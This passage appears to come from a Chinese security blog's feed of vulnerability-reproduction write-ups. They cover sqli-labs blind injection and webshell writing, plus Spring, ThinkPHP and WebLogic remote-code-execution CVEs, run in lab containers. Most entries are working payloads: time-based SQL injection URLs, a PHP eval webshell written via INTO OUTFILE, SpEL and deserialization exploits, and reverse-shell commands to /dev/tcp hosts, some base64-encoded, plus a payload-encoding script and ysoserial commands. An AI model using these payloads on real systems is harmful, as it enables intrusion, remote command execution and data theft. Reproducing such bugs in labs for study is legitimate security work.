<p>猜测第一个数据表的第一位是 e,…依次类推，得到<code>email</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and If(ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 1,1),1,1))&#x3D;114,1,sleep(5))--+</span><br></pre></td></tr></table></figure>
<p>猜测第二个数据表的第一位是 r,…依次类推，得到<code>referers</code></p>
<p>……</p>
<p>再以此类推，我们可以得到所有的数据表<code>emails,referers,uagents,users</code></p>
<h3 id="猜测users表的列"><a href="#猜测users表的列" class="headerlink" title="猜测users表的列"></a>猜测users表的列</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-9&#x2F;?id&#x3D;1 &#39;and If(ascii(substr((select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 0,1),1,1))&#x3D;105,1,sleep(5))--+</span><br></pre></td></tr></table></figure>
<p>猜测<code>users</code>表的第一个列的第一个字符是 i，<br>以此类推，我们得到列名是<code>id,username,password</code></p>
<h3 id="猜测username的值"><a href="#猜测username的值" class="headerlink" title="猜测username的值"></a>猜测username的值</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-9&#x2F;?id&#x3D;1&#39;and If(ascii(substr((select username from users limit 0,1), 1,1))&#x3D;67,1,sleep(5))--+</span><br></pre></td></tr></table></figure>
<p>猜测<code>username</code>的第一行的第一位</p>
<p>以此类推，我们得到数据库<code>username,password</code>的所有内容</p>
<h2 id="Less10"><a href="#Less10" class="headerlink" title="Less10"></a>Less10</h2><p>本关我们从标题就可以看到《基于时间-双引号》，所以很明显的这关要我们利用延时注入进行，同时id参数进行的是“的处理。和less9的区别就在于单引号（‘）变成了（“）,我们这里给出一个 payload 示例，其他的请参考 less-9</p>
<h3 id="猜测数据库-1"><a href="#猜测数据库-1" class="headerlink" title="猜测数据库"></a>猜测数据库</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-10&#x2F;?id&#x3D;1&quot; and If(ascii(substr(database(),1,1))&#x3D;115,1,sleep(5))--+</span><br></pre></td></tr></table></figure>
<p>其余的示例请参考 less9</p>
]]></content>
      <categories>
        <category>sqli-labs靶场</category>
      </categories>
      <tags>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs靶场Less-7(上传webshell)</title>
    <url>/posts/6dd81cb5.html</url>
    <content><![CDATA[<h2 id="Less7"><a href="#Less7" class="headerlink" title="Less7"></a>Less7</h2><p>本关利用文件导入的方式进行注入</p>
<p>查看源码，重点关注对id参数的处理和sql语句上，源代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;((&#39;$id&#39;)) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
<p>这里对id参数进行了’))处理，所以可以尝试<code>&#39;)) or 1=1--+</code>进行注入</p>
<p><img src="https://qiniu.hzktester.top/tp2020100201.png" alt="image"></p>
<p>我们这里利用上述提到的文件导入的方式进行演示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-7&#x2F;?id&#x3D;1&#39;))UNION SELECT 1,2,3 into outfile &quot;D:\\phpStudy\\WWW\\sqli-labs\\Less-7\\1.txt&quot;--+</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020100202.png" alt="image"></p>
<p>上图中显示sql语句出错了，但是文件中可以看到1.txt已经生成了。</p>
<p><img src="https://qiniu.hzktester.top/tp2020100203.png" alt="image"></p>
<p>直接写入php一句话</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-7&#x2F;?id&#x3D;1&#39;))UNION SELECT 1,2,&#39;&lt;?php @eval($_post[&quot;mima&quot;])?&gt;&#39; into outfile &quot;D:\\phpStudy\\WWW\\sqli-labs\\Less-7\\yijuhua.php&quot;--+</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020100204.png" alt="image"></p>
<p>文件中可以看到已经上传成功了</p>
<p><img src="https://qiniu.hzktester.top/tp2020100205.png" alt="image"></p>
<p>然后使用冰蝎、菜刀等工具连接即可</p>
]]></content>
      <categories>
        <category>sqli-labs靶场</category>
      </categories>
      <tags>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>Spring Cloud Config 目录穿越漏洞复现（CVE-2020-5410）</title>
    <url>/posts/a05af4c0.html</url>
    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Spring Cloud Config 为分布式系统中的外部配置提供服务器和客户端支持，使用 Config Server ，用户可以在所有环境中管理应用程序的外部属性。<br>近日，百度云安全团队监测到 Spring Cloud Config 官方发布了一个目录遍历漏洞的风险通告，漏洞编号为 CVE-2020-5410 。攻击者可通过构造特殊的 HTTP 请求，从而跨目录读取文件。</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>2.2.x&lt;=2.2.2 2.1.x&lt;=2.1.8</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>使用vulfocus启动漏洞环境</p>
<p><img src="https://qiniu.hzktester.top/tp2020092923.png" alt="image"></p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>直接访问<br><code>http://47.101.62.20:48259/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Ftmp%23foo/development</code></p>
<p><img src="https://qiniu.hzktester.top/tp2020092924.png" alt="image"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Spring</tag>
      </tags>
  </entry>
  <entry>
    <title>Spring Data Commons 远程命令执行漏洞（CVE-2018-1273）</title>
    <url>/posts/71711a88.html</url>
    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Spring Data是一个用于简化数据库访问，并支持云服务的开源框架，Spring Data Commons是Spring Data下所有子项目共享的基础框架。Spring Data Commons 在2.0.5及以前版本中，存在一处SpEL表达式注入漏洞，攻击者可以注入恶意SpEL表达式以执行任意命令。</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Spring Data Commons 1.13 - 1.13.10(Ingalls SR10)</p>
<p>Spring Data REST 2.6 - 2.6.10 (Ingalls SR10)</p>
<p>Spring Data Commons 2.0 - 2.0.5 (Kay SR5)</p>
<p>Spring Data REST 3.0 - 3.0.5 (Kay SR5)</p>
<p>已不支持的旧版本</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;vulhub&#x2F;spring&#x2F;CVE-2018-1273&#x2F;</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
<p>稍等一会，环境启动后，访问<code>http://your-ip:8080/users</code>，将可以看到一个用户注册页面。</p>
<p><img src="https://qiniu.hzktester.top/tp2020092917.png" alt="image"></p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>填写信息，点击<code>Register user</code> 然后抓包</p>
<p><img src="https://qiniu.hzktester.top/tp2020092918.png" alt="image"></p>
<p>修改<code>username</code>参数POC并发包:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username[#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;touch &#x2F;tmp&#x2F;success&quot;)]&#x3D;</span><br></pre></td></tr></table></figure>

<p><img src="https://qiniu.hzktester.top/tp2020092919.png" alt="image"></p>
<p>进入docker容器查看：</p>
<p><img src="https://qiniu.hzktester.top/tp2020092920.png" alt="image"></p>
<p>修改poc为反弹shell：<br>还是先base64编码，再url编码后发包:</p>
<p><img src="https://qiniu.hzktester.top/tp2020092921.png" alt="image"></p>
<p>反弹shell成功：</p>
<p><img src="https://qiniu.hzktester.top/tp2020092922.png" alt="image"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Spring</tag>
      </tags>
  </entry>
  <entry>
    <title>Spring Data REST PATCH 请求代码执行漏洞复现（CVE-2017-8046）</title>
    <url>/posts/eea09eec.html</url>
    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Spring Data REST是Spring Data项目的一部分，可以轻松地在Spring Data存储库之上构建超媒体驱动的REST Web服务。</p>
<p>恶意的PATCH请求使用精心构造的JSON数据提交到spring-data-rest服务可以执行任意JAVA代码</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Spring Data REST versions prior to 2.5.12, 2.6.7, 3.0 RC3</p>
<p>可以查看spring-data-rest-webmvc jar包的版本</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;vulhub&#x2F;spring&#x2F;CVE-2017-8046&#x2F;</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
<p>等待环境启动完成，然后访问<a href="http://your-ip:8080/%E5%8D%B3%E5%8F%AF%E7%9C%8B%E5%88%B0json%E6%A0%BC%E5%BC%8F%E7%9A%84%E8%BF%94%E5%9B%9E%E5%80%BC%EF%BC%8C%E8%AF%B4%E6%98%8E%E8%BF%99%E6%98%AF%E4%B8%80%E4%B8%AARestful%E9%A3%8E%E6%A0%BC%E7%9A%84API%E6%9C%8D%E5%8A%A1%E5%99%A8%E3%80%82">http://your-ip:8080/即可看到json格式的返回值，说明这是一个Restful风格的API服务器。</a></p>
<p><img src="https://qiniu.hzktester.top/tp2020092912.png" alt="image"></p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>访问<code>http://your-ip:8080/customers/1</code>，看到一个资源。我们使用<code>PATCH</code>请求来修改之：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PATCH &#x2F;customers&#x2F;1 HTTP&#x2F;1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;json-patch+json</span><br><span class="line">Content-Length: 202</span><br><span class="line"></span><br><span class="line">[&#123; &quot;op&quot;: &quot;replace&quot;, &quot;path&quot;: &quot;T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]&#123;116,111,117,99,104,32,47,116,109,112,47,115,117,99,99,101,115,115&#125;))&#x2F;lastname&quot;, &quot;value&quot;: &quot;vulhub&quot; &#125;]</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>path的值是SpEL表达式，发送上述数据包，将执行<code>new byte[]&#123;116,111,117,99,104,32,47,116,109,112,47,115,117,99,99,101,115,115&#125;</code>表示的命令<code>ouch /tmp/success</code>。</p>
<p><img src="https://qiniu.hzktester.top/tp2020092913.png" alt="image"></p>
<p>然后进入容器<code>docker exec -it 容器id /bin/bash</code>看看：</p>
<p><img src="https://qiniu.hzktester.top/tp2020092914.png" alt="image"></p>
<p>制作反弹shell的POC:</p>
<p>命令：<code>bash -i &gt;&amp; /dev/tcp/10.10.10.10/7777 0&gt;&amp;1</code></p>
<p><a href="http://www.jackson-t.ca/runtime-exec-payloads.html">base64编码</a>：<code>bash -c &#123;echo,YGJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTAuMTAvNzc3NyAwPiYxYA==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</code></p>
<p>通过下面的python代码将每个字符转为对应的十进制：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload &#x3D; b&#39;这里填poc&#39;</span><br><span class="line">bytecode &#x3D; &#39;,&#39;.join(str(i) for i in list(payload))</span><br><span class="line">print(bytecode)</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020092915.png" alt="image"></p>
<p>重新发包修改为反弹shell的poc：</p>
<p><img src="https://qiniu.hzktester.top/tp2020092916.png" alt="image"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Spring</tag>
      </tags>
  </entry>
  <entry>
    <title>Spring WebFlow 远程代码执行漏洞（CVE-2017-4971）</title>
    <url>/posts/f3c13ec6.html</url>
    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Spring WebFlow 是一个适用于开发基于流程的应用程序的框架（如购物逻辑），可以将流程的定义和实现流程行为的类和视图分离开来。在其 2.4.x 版本中，如果我们控制了数据绑定时的field，将导致一个SpEL表达式注入漏洞，最终造成任意命令执行。</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Spring WebFlow 2.4.0 – 2.4.4</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;vulhub&#x2F;spring&#x2F;CVE-2017-4971&#x2F;</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
<p>等待环境启动后，访问<code>http://your-ip:8080</code>，将看到一个酒店预订的页面，这是<code>spring-webflow</code>官方给的简单示例。</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>首先访问<code>http://your-ip:8080/login</code>，用页面左边给出的任意一个账号/密码登录系统：</p>
<p><img src="https://qiniu.hzktester.top/tp2020092905.png" alt="image"></p>
<p>然后访问id为1的酒店<code>http://your-ip:8080/hotels/1</code>，点击预订按钮“Book Hotel”，填写相关信息后点击“Proceed”（从这一步，其实WebFlow就正式开始了）：</p>
<p><img src="https://qiniu.hzktester.top/tp2020092906.png" alt="image"></p>
<p>再点击确认“Confirm”，此时抓包：</p>
<p><img src="https://qiniu.hzktester.top/tp2020092907.png" alt="image"></p>
<p><img src="https://qiniu.hzktester.top/tp2020092908.png" alt="image"></p>
<p>我们向其中添加一个字段（也就是反弹shell的POC）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_(new java.lang.ProcessBuilder(&quot;bash&quot;,&quot;-c&quot;,&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.0.0.1&#x2F;21 0&gt;&amp;1&quot;)).start()&#x3D;vulhub</span><br></pre></td></tr></table></figure>

<p>把反弹shell的POC进行URL编码</p>
<p><img src="https://qiniu.hzktester.top/tp2020092909.png" alt="image"></p>
<p>重放数据包</p>
<p><img src="https://qiniu.hzktester.top/tp2020092910.png" alt="image"></p>
<p>成功反弹shell</p>
<p><img src="https://qiniu.hzktester.top/tp2020092911.png" alt="image"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Spring</tag>
      </tags>
  </entry>
  <entry>
    <title>Spring Security OAuth2 远程命令执行漏洞复现（CVE-2016-4977）</title>
    <url>/posts/8059749f.html</url>
    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Spring Security OAuth2处理认证请求的时候如果使用了whitelabel视图，response_type参数值会被当做Spring SpEL来执行，恶意攻击者通过构造response_type值可以触发远程代码执行漏洞 </p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>使用vulhub搭建漏洞环境</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;vulhub&#x2F;spring&#x2F;CVE-2016-4977&#x2F;</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
<p>启动完成后，访问<a href="http://your-ip:8080/%E5%8D%B3%E5%8F%AF%E7%9C%8B%E5%88%B0web%E9%A1%B5%E9%9D%A2%E3%80%82">http://your-ip:8080/即可看到web页面。</a></p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Spring Security OAuth 2.3到2.3.2</p>
<p>Spring Security OAuth 2.2到2.2.1</p>
<p>Spring Security OAuth 2.1到2.1.1</p>
<p>Spring Security OAuth 2.0到2.0.14</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>访问<code>http://your-ip:8080/oauth/authorize?response_type=$&#123;233*233&#125;&amp;client_id=acme&amp;scope=openid&amp;redirect_uri=http://test</code>。首先需要填写用户名和密码，我们这里填入<code>admin:admin</code>即可。</p>
<p><img src="https://qiniu.hzktester.top/tp2020092901.png" alt="image"></p>
<p>对反弹shell的POC进行base64编码<br><a href="http://www.jackson-t.ca/runtime-exec-payloads.html">http://www.jackson-t.ca/runtime-exec-payloads.html</a></p>
<p><img src="https://qiniu.hzktester.top/tp2020092902.png" alt="image"></p>
<p>使用<code>poc.py</code>生成反弹shell的POC：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">message &#x3D; input(&#39;Enter message to encode:&#39;)</span><br><span class="line"></span><br><span class="line">poc &#x3D; &#39;$&#123;T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)&#39; % ord(message[0])</span><br><span class="line"></span><br><span class="line">for ch in message[1:]:</span><br><span class="line">   poc +&#x3D; &#39;.concat(T(java.lang.Character).toString(%s))&#39; % ord(ch) </span><br><span class="line"></span><br><span class="line">poc +&#x3D; &#39;)&#125;&#39;</span><br><span class="line"></span><br><span class="line">print(poc)</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020092903.png" alt="image"></p>
<p>监听反弹shell，并访问URL<code>http://your-ip:8080/oauth/authorize?response_type=上面的那一长串POC&amp;client_id=acme&amp;scope=openid&amp;redirect_uri=http://test</code></p>
<p><img src="https://qiniu.hzktester.top/tp2020092904.png" alt="image"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Spring</tag>
      </tags>
  </entry>
  <entry>
    <title>ThinkPHP 2.x 任意代码执行漏洞复现</title>
    <url>/posts/5c231b10.html</url>
    <content><![CDATA[<h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p>ThinkPHP 2.x版本中，使用 <strong>preg_replace</strong> 的 <strong>/e</strong> 模式匹配路由：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$res &#x3D; preg_replace(&#39;@(\w+)&#39;.$depr.&#39;([^&#39;.$depr.&#39;\&#x2F;]+)@e&#39;, &#39;$var[\&#39;\\1\&#39;]&#x3D;&quot;\\2&quot;;&#39;, implode($depr,$paths));</span><br></pre></td></tr></table></figure>
<p>导致用户的输入参数被插入双引号中执行，造成任意代码执行漏洞。</p>
<p>ThinkPHP 3.0版本因为Lite模式下没有修复该漏洞，也存在这个漏洞。</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>使用vulfocous启动漏洞环境</p>
<p><img src="https://qiniu.hzktester.top/tp2020092801.png" alt="image"></p>
<p>打开就是ThinkPHP的默认页面</p>
<p><img src="https://qiniu.hzktester.top/tp2020092802.png" alt="image"></p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>直接访问 <strong><a href="http://your-ip:8080/index.php?s=/index/index/name/$%7B@phpinfo()%7D">http://your-ip:8080/index.php?s=/index/index/name/$%7B@phpinfo()%7D</a></strong> 即可执行<strong>phpinfo()</strong>:</p>
<p><img src="https://qiniu.hzktester.top/tp2020092803.png" alt="image"></p>
<p>然后接入一句话</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index.php?s&#x3D;&#x2F;index&#x2F;index&#x2F;xxx&#x2F;$&#123;$&#123;@eval($_POST[1])&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>使用蚁剑连接</p>
<p><img src="https://qiniu.hzktester.top/tp2020092804.png" alt="image"></p>
<p>拿到flag</p>
<p><img src="https://qiniu.hzktester.top/tp2020092805.png" alt="image"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>ThinkPHP</tag>
      </tags>
  </entry>
  <entry>
    <title>ThinkPHP 5.x 远程代码执行漏洞复现（CNVD-2018-24942）</title>
    <url>/posts/6cb1a1d1.html</url>
    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>ThinkPHP5 存在远程代码执行漏洞。该漏洞由于框架对控制器名未能进行足够的检测，攻击者利用该漏洞对目标网站进行远程命令执行攻击。</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>上海顶想信息科技有限公司 ThinkPHP 5.*，&lt;5.1.31</p>
<p>上海顶想信息科技有限公司 ThinkPHP &lt;=5.0.23</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>使用 vulfocus 启动漏洞环境</p>
<p><img src="https://qiniu.hzktester.top/tp2020092806.png" alt="image"></p>
<p>访问页面如下：</p>
<p><img src="https://qiniu.hzktester.top/tp2020092807.png" alt="image"></p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index.php&#x2F;?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;ls%20&#x2F;tmp</span><br></pre></td></tr></table></figure>
<p>直接访问拿到flag</p>
<p><img src="https://qiniu.hzktester.top/tp2020092808.png" alt="image"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>ThinkPHP</tag>
      </tags>
  </entry>
  <entry>
    <title>WebLogic T3协议反序列化漏洞复现（CVE-2018-2628）</title>
    <url>/posts/5c6d7c93.html</url>
    <content><![CDATA[<h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p>开放Weblogic控制台的7001端口，默认会开启T3协议服务，T3协议触发的Weblogic Server WLS Core Components中存在反序列化漏洞，攻击者可以发送构造的恶意T3协议数据，获取目标服务器权限。</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Weblogic 10.3.6.0<br>Weblogic 12.1.3.0<br>Weblogic 12.2.1.2<br>Weblogic 12.2.1.3</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="靶机环境"><a href="#靶机环境" class="headerlink" title="靶机环境"></a>靶机环境</h3><p>使用vulhub搭建漏洞环境</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd vulhub&#x2F;weblogic&#x2F;CVE-2018-2628</span><br><span class="line"></span><br><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020092711.png" alt="image"></p>
<p>访问 <a href="http://47.101.62.20:7001/console">http://47.101.62.20:7001/console</a> 初始化整个环境</p>
<h3 id="攻击机环境"><a href="#攻击机环境" class="headerlink" title="攻击机环境"></a>攻击机环境</h3><p>下载 <strong>ysoserial-0.0.6-SNAPSHOT-BETA-all.jar</strong>利用包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;github.com&#x2F;brianwrf&#x2F;ysoserial&#x2F;releases&#x2F;download&#x2F;0.0.6-pri-beta&#x2F;ysoserial-0.0.6-SNAPSHOT-BETA-all.jar</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020092712.png" alt="image"></p>
<p>下载漏洞利用EXP，我这里已经下载好了</p>
<p><a href="https://www.exploit-db.com/exploits/44553">https://www.exploit-db.com/exploits/44553</a></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>监听端口19110</p>
<p><img src="https://qiniu.hzktester.top/tp2020092713.png" alt="image"></p>
<p>使用<strong>ysoserial</strong>启动一个<strong>JMRP Server</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 19111 CommonsCollections1 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDEuNjIuMjAvMTkxMTAgMD4mMQ&#x3D;&#x3D;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>JMRP Server在19111端口上监听请求，向目标服务器发送序列化的bash反弹shell命令，反弹监听的端口为19110</p>
</blockquote>
<p><img src="https://qiniu.hzktester.top/tp2020092714.png" alt="image"></p>
<p>使用CVE-2018-2628的EXP向目标WebLogic服务器发送攻击载荷</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python CVE-2018-2628.py 47.101.62.20 7001 ..&#x2F;ysoserial-0.0.6-SNAPSHOT-BETA-all.jar 47.101.62.20 19111 JRMPClient</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020092715.png" alt="image"></p>
<p>成功反弹shell</p>
<p><img src="https://qiniu.hzktester.top/tp2020092716.png" alt="image"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>WebLogic</tag>
      </tags>
  </entry>
  <entry>
    <title>WebLogic任意文件上传漏洞复现（CVE-2018-2894）</title>
    <url>/posts/c10a0e25.html</url>
    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Oracle官方发布了7月份的关键补丁更新CPU（Critical Patch Update）,其中包含一个高危的Weblogic未授权任意文件上传漏洞(CVE-2018-2894)</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Oracle WebLogic Server，版本<strong>10.3.6.0，12.1.3.0，12.2.1.2，12.2.1.3</strong>。 </p>
<p>该漏洞的影响模块为web服务测试页，在默认情况下不启用。 受影响的页面为 <strong>/ws_utc/config.do</strong> 和 <strong>/ws_utc/begin.do</strong></p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>使用vulhub搭建漏洞环境</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd vulhub&#x2F;weblogic&#x2F;CVE-2018-2894</span><br><span class="line"></span><br><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
<p>直接访问存在漏洞的页面<strong><a href="http://47.101.62.20:7001/ws_utc/config.do">http://47.101.62.20:7001/ws_utc/config.do</a></strong><br><img src="https://qiniu.hzktester.top/tp2020092706.png" alt="image"></p>
<p>将目录设置为<strong>ws_utc</strong>应用的静态文件css目录，访问这个目录是无需权限的,可以直接进行访问上传的文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;u01&#x2F;oracle&#x2F;user_projects&#x2F;domains&#x2F;base_domain&#x2F;servers&#x2F;AdminServer&#x2F;tmp&#x2F;_WL_internal&#x2F;com.oracle.webservices.wls.ws-testclient-app-wls&#x2F;4mcj4y&#x2F;war&#x2F;css</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020092707.png" alt="image"></p>
<p>打开安全页面，然后上传<strong>webshell</strong>，并且获取时间戳<br><img src="https://qiniu.hzktester.top/tp2020092708.png" alt="image"><br><img src="https://qiniu.hzktester.top/tp2020092709.png" alt="image"></p>
<p>访问上传的jsp马</p>
<blockquote>
<p>具体格式为 <a href="http://your-ip:7001/ws_utc/css/config/keystore/[%E6%97%B6%E9%97%B4%E6%88%B3]_[%E6%96%87%E4%BB%B6%E5%90%8D]">http://your-ip:7001/ws_utc/css/config/keystore/[时间戳]_[文件名]</a></p>
</blockquote>
<p><img src="https://qiniu.hzktester.top/tp2020092710.png" alt="image"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>WebLogic</tag>
      </tags>
  </entry>
  <entry>
    <title>WebLogic反序列化漏洞复现（CVE-2017-10271）</title>
    <url>/posts/f04107ca.html</url>
